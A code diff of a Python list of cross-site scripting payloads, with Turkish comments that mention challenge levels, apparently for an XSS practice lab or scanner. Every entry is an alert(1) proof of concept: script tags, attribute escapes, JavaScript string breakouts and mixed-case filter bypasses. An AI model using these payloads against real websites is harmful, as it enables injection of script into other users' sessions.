@@ -1,29 +1,25 @@
-# Çeşitli XSS bağlamlarını hedefleyen payload listesi
+# XSS Payload Listesi
 XSS_PAYLOADS = [
-    # 1. Temel Payload (Filtresiz Yansıma)
     "<script>alert(1)</script>",
-    "<Script>alert(1)</sCript>",
+    "<ScRiPt>alert(1)</sCrIpT>",
 
-    # 2. HTML Nitelik (Attribute) Kaçışı (Level 3)
-    # img etiketi ile on* olayları
+    # Attribute kaçışları
     '<img src=x onerror=alert(1)>',
     'x" onmouseover="alert(1)"',
     "x' onerror='alert(1)'",
     '"><svg onload=alert(1)>',
 
-    # 3. JavaScript Bağlamından Çıkış (Level 4)
-    # Tırnak/Parantez Kapatma ve Yorumlama
-    "'); alert(1)//",  # startTimer('...payload...') gibi yerler için
+    # JS context çıkışları
+    "'); alert(1)//",
     "'); alert(1); var x='",
 
-    # 4. JavaScript Bloğunu Kapatma (Level 4'ün alternatifi)
+    # JS blok kapatma
     "'</script><script>alert(1)</script>",
 
-    # 5. Protokol İşleyici Kaçışı (Level 5)
-    # href veya src nitelikleri için
+    # javascript: protokolü
     "javascript:alert(1)",
-    "JaVaScRipT:alert(1)", # Büyük/küçük harf bypass'ı
+    "JaVaScRiPt:alert(1)",
 
-    # 6. HTML Etiket Kapatma (Input alanlarından çıkış)
-    '"><input type="hidden" onfocus="alert(1)" autofocus>',
+    # HTML escape bypass
+    '"><input autofocus onfocus=alert(1)>',
 ]
